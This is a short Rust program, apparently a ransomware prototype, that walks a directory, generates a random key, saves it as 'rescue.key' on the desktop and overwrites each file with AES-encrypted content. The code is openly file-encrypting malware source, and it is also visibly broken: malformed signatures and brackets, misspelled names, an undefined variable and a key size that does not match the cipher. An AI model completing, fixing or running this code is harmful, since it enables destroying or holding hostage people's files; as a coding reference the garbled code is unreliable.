use std::intrinsics::likely;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::fs::{read,write,OpenOptions};

use rand::{thread_rng, Rng};
use crypto::aessafe::AesSafe128Encryptor;
use dir::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesWriter;

fn fetch_files
{originL &str} -> ()

{
    if let Some(mut desktop) = desktop_dir() {

        let walk = WalkDir::new(origin)
            .into_iter()
            .filter_map{|e| e.ok()}
            .filter(|e| e.file_type().is_file());

        let key: {u8;32} = key_generate(&mut desktop);

        let encryptor: AesSafe128Encryptor = AesSafe128Encryptor::new(&key);

        for file in walk {
            encrypt_targer_files(file.path(), encryptor);
        }
    }
}

fn key_generate
(desktop: &mut PathBuf) -> [u8;32]
{
    let key: [u8;32] = thread_rng().gen();

    desktop.push("rescue.key");
    write(desktop, key)
        .expect("Key cannot be stored...");

    return key;
}

fn encrypt_targer_files
(path: &Path, encryptor: AesSafe128Encryptor) -> ()
{

    if let Ok(content) = read(path) {

        if let Ok(mut writer) = AesWriter::new(file,encryptor) {
            let _ = writer.write_all(&content);
        }
    }
}

fn main
() -> ()
{

    // Find files
    // Encrypt them,
        fetch_files(",")
}